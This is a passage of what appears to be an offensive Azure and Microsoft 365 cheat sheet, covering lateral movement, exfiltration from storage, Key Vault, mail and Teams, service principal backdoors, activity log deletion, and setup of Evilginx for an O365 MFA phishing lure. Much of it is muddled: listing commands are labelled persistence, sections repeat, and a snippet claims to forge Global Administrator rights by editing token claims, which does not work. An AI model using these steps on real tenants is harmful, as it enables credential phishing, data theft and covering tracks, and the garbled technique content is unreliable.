### Service Principal Abuse
**Scenario**: You need to abuse service principals for privilege escalation.

- Service principal impersonation
  ```powershell
  # PowerShell
  az ad sp show --id <sp-id>
  ```

## 4. Lateral Movement

### Cloud-to-Cloud Movement
**Scenario**: You need to move between different Azure services and resources.

- Graph API exploitation
  ```powershell
  # PowerShell
  Connect-MgGraph
  Get-MgUser
  Get-MgGroup
  Get-MgTeam
  ```

- Exchange/Teams/SharePoint access
  ```powershell
  # PowerShell
  Get-MgUserMailbox
  Get-MgTeam
  Get-MgSite
  ```

### Hybrid Movement
**Scenario**: You need to move between on-premises and cloud resources.

- On-premises to cloud
  ```powershell
  # PowerShell
  Get-AzVM
  Get-AzVM -ResourceGroupName <resource-group> -Name <vm-name>
  ```

### Resource Movement
**Scenario**: You need to move between different Azure resources.

- Container app exploitation
  ```powershell
  # Azure CLI
  az containerapp list
  az containerapp show --name <container-app>
  ```

- Function app movement
  ```powershell
  # Azure CLI
  az functionapp list
  az functionapp show --name <function-app>
  ```

### Credential Shuffle
**Scenario**: You need to shuffle credentials between resources.

- Token reuse
  ```powershell
  # PowerShell
  Get-AzAccessToken
  Get-AzToken
  ```

## 5. Data Exfiltration

### Storage Access
**Scenario**: You need to exfiltrate data from Azure storage resources.

- Blob storage exfiltration
  ```powershell
  # Azure CLI
  az storage blob download --account-name <storage-account> --container-name <container> --name <blob> --file <local-path>
  ```

- Key Vault secrets
  ```powershell
  # Azure CLI
  az keyvault secret list --vault-name <vault>
  az keyvault secret show --vault-name <vault> --name <secret>
  ```

### Application Data
**Scenario**: You need to exfiltrate data from Microsoft 365 services.

- Exchange data
  ```powershell
  # PowerShell
  Get-MgUserMailbox
  Get-MgUserMessage
  ```

- Teams data
  ```powershell
  # PowerShell
  Get-MgTeam
  Get-MgTeamChannel
  ```

### Monitoring & Logging
**Scenario**: You need to access monitoring and logging data.

- Activity log access
  ```powershell
  # Azure CLI
  az monitor activity-log list
  ```

- Diagnostic settings
  ```powershell
  # Azure CLI
  az monitor diagnostic-settings list
  ```

### Exchange Data
**Scenario**: You need to exfiltrate Exchange data.

- Get mailbox data
  ```powershell
  # PowerShell
  Get-MgUserMailbox
  ```

- Get message data
  ```powershell
  # PowerShell
  Get-MgUserMessage
  ```

### Teams Data
**Scenario**: You need to exfiltrate Teams data.

- Get team data
  ```powershell
  # PowerShell
  Get-MgTeam
  ```

- Get channel data
  ```powershell
  # PowerShell
  Get-MgTeamChannel
  ```

### SharePoint Data
**Scenario**: You need to exfiltrate SharePoint data.

- Get site data
  ```powershell
  # PowerShell
  Get-MgSite
  ```

## 6. Persistence

### Entra ID Persistence
**Scenario**: You need to maintain access to the environment.

- Service principal backdoors
  ```powershell
  # Azure CLI
  az ad sp create --id <application-id>
  az role assignment create --assignee <sp-id> --role <role-name>
  ```

- Role assignment persistence
  ```powershell
  # Azure CLI
  az role assignment create --assignee <principal-id> --role <role-name>
  ```

### Azure Resource Persistence
**Scenario**: You need to maintain access to Azure resources.

- Automation account persistence
  ```powershell
  # Azure CLI
  az automation account list
  az automation runbook list
  ```

- Function app persistence
  ```powershell
  # Azure CLI
  az functionapp list
  az functionapp show --name <function-app>
  ```

### Access Persistence
**Scenario**: You need to maintain various types of access.

- Token persistence
  ```powershell
  # PowerShell
  Get-AzAccessToken
  Get-AzToken
  ```

- Certificate persistence
  ```powershell
  # PowerShell
  Get-PfxCertificate -FilePath <path>
  Import-PfxCertificate -FilePath <path> -CertStoreLocation Cert:\CurrentUser\My
  ```

### Token Persistence
**Scenario**: You need to maintain token access.

- Token reuse
  ```powershell
  # PowerShell
  Get-AzAccessToken
  Get-AzToken
  ```

### Certificate Persistence
**Scenario**: You need to maintain certificate access.

- Certificate reuse
  ```powershell
  # PowerShell
  Get-PfxCertificate -FilePath <path>
  Import-PfxCertificate -FilePath <path> -CertStoreLocation Cert:\CurrentUser\My
  ```

## 7. Cleanup & Obfuscation

### Log Manipulation
**Scenario**: You need to remove evidence of your activities.

- Activity log modification
  ```powershell
  # Azure CLI
  az monitor activity-log list
  az monitor activity-log delete
  ```

### Evidence Removal
**Scenario**: You need to remove evidence of your presence.

- Service principal cleanup
  ```powershell
  # Azure CLI
  az ad sp delete --id <sp-id>
  ```

- Role assignment removal
  ```powershell
  # Azure CLI
  az role assignment delete --assignee <principal-id> --role <role-name>
  ```

### Access Cleanup
**Scenario**: You need to clean up access methods.

- Connection removal
  ```powershell
  # Azure CLI
  az account clear
  ```

- Key removal
  ```powershell
  # Azure CLI
  az keyvault key delete --vault-name <vault> --name <key>
  ```

### Token Cleanup
**Scenario**: You need to clean up tokens.

- Token reuse
  ```powershell
  # PowerShell
  Get-AzAccessToken
  Get-AzToken
  ```

### Certificate Cleanup
**Scenario**: You need to clean up certificates.

- Certificate reuse
  ```powershell
  # PowerShell
  Get-PfxCertificate -FilePath <path>
  Import-PfxCertificate -FilePath <path> -CertStoreLocation Cert:\CurrentUser\My
  ```

## Tools & Techniques

### Enumeration Tools
- AADInternals
  ```powershell
  # Install
  Install-Module AADInternals
  Import-Module AADInternals

  # Tenant Enumeration
  Get-AADIntTenantID -Domain "domain.com"
  Get-AADIntLoginInformation -Domain "domain.com"

  # User Enumeration
  Get-AADIntUsers -Domain "domain.com"
  Get-AADIntUsers -Domain "domain.com" -IncludeGuests

  # Resource Enumeration
  Get-AADIntReconAsOutsider -Domain "domain.com"
  Get-AADIntReconAsInsider -Domain "domain.com"

  # Token Enumeration
  Get-AADIntAccessTokenForAADGraph
  Get-AADIntAccessTokenForMSGraph
  ```

- Oh365UserFinder
  ```ruby
  # Install
  git clone https://github.com/dievus/Oh365UserFinder
  cd Oh365UserFinder
  pip3 install -r requirements.txt

  # Run
  python3 Oh365UserFinder.py -d domain.com -u users.txt
  ```

- Username Anarchy
  ```ruby
  # Install
  git clone https://github.com/urbanadventurer/username-anarchy
  cd username-anarchy

  # Run
  ruby username-anarchy --suffix @domain.com "Full Name" > users.txt
  ```

### Attack Tools
- Evilginx
  ```bash
  # Install
  git clone https://github.com/kgretzky/evilginx2
  cd evilginx2
  make
  ./evilginx

  # Configuration
  phishlets hostname o365-mfa domain.com
  phishlets enable o365-mfa
  lures create o365-mfa
  lures get-url <lure-id>
  ```

- GraphRunner
  ```powershell
  # Install
  Install-Module Microsoft.Graph
  Import-Module Microsoft.Graph

  # Configuration
  Connect-MgGraph -Scopes "User.Read.All", "Group.Read.All", "Mail.Read"

  # Usage
  Get-MgUser -All
  Get-MgGroup -All
  Get-MgTeam -All
  Get-MgUserMailbox
  Get-MgUserMessage
  ```

### Post-Exploitation Tools
- Azure Storage Explorer
  ```powershell
  # Azure CLI
  az storage blob list --account-name <storage-account>
  az storage blob download --account-name <storage-account> --container-name <container> --name <blob>
  az storage container list --account-name <storage-account>
  az storage account show --name <storage-account>
  ```

- GraphRunner
  ```powershell
  # PowerShell
  Get-GraphToken
  Invoke-GraphRequest
  Get-MgUser -All
  Get-MgGroup -All
  Get-MgTeam -All
  Get-MgUserMailbox
  Get-MgUserMessage
  ```

### Data Exfiltration Tools
- Azure Storage Explorer
  ```powershell
  # Azure CLI
  az storage blob list --account-name <storage-account>
  az storage blob download --account-name <storage-account> --container-name <container> --name <blob>
  az storage container list --account-name <storage-account>
  az storage account show --name <storage-account>
  ```

- GraphRunner
  ```powershell
  # PowerShell
  Get-MgUserMailbox
  Get-MgUserMessage
  Get-MgTeam
  Get-MgTeamChannel
  Get-MgSite
  ```

### Cleanup Tools
- Azure CLI
  ```powershell
  # Account Cleanup
  az account clear

  # Key Cleanup
  az keyvault key delete --vault-name <vault> --name <key>

  # Role Assignment Cleanup
  az role assignment delete --assignee <principal-id> --role <role-name>

  # Service Principal Cleanup
  az ad sp delete --id <sp-id>
  ```

### Evasion Tools
- Token Manipulation
  ```powershell
  # PowerShell
  $token = Get-AzAccessToken
  $decoded = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($token.split('.')[1]))
  $claims = $decoded | ConvertFrom-Json
  $claims.roles = @("Global Administrator")
  $modifiedToken = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($claims | ConvertTo-Json))
  ```

- Log Manipulation
  ```powershell
  # Azure CLI
  az monitor activity-log list
  az monitor activity-log delete
  ```

### Persistence Tools
- Service Principal Backdoors
  ```powershell
  # Azure CLI
  az ad sp create --id <application-id>
  az role assignment create --assignee <sp-id> --role <role-name>
  ```

- Role Assignment Persistence
  ```powershell
  # Azure CLI
  az role assignment create --assignee <principal-id> --role <role-name>
  ```

- Automation Account Persistence
  ```powershell
  # Azure CLI
  az automation account list
  az automation runbook list
  ```

- Function App Persistence
  ```powershell
  # Azure CLI
  az functionapp list
  az functionapp show --name <function-app>
  ```

## Best Practices

### Tool Selection
- Choose tools based on target environment
- Consider detection capabilities
- Use multiple tools for validation
- Implement proper logging
- Consider detection evasion

### Infrastructure Setup
- Use clean infrastructure
- Implement proper logging
- Consider detection evasion
- Use secure connections
- Follow least privilege principle

### Documentation
- Document tool usage
- Track success rates
- Maintain tool configurations
- Log all activities
- Validate results

### Detection Evasion
- Use evasion techniques
- Hide activities
- Use multiple tools
- Implement proper logging
- Consider detection capabilities

### Cleanup Procedures
- Remove evidence
- Clean up access
- Implement token cleanup
- Implement certificate cleanup

- Remove all traces
- Implement access cleanup
- Implement token cleanup
- Implement certificate cleanup

- Remove all traces
- Implement access cleanup
- Implement token cleanup
- Implement certificate cleanup

### Persistence Methods
- Service principal backdoors
- Role assignment persistence
- Automation account persistence
- Function app persistence
- Access persistence
- Token persistence
- Certificate persistence
- Secret persistence
- Connection persistence

### Evasion Techniques
- Activity log modification
- Service principal cleanup
- Role assignment removal
- Connection removal
- Key removal
- Token reuse
- Certificate reuse
- Access cleanup
- Token cleanup
- Certificate cleanup
- Access policy cleanup 
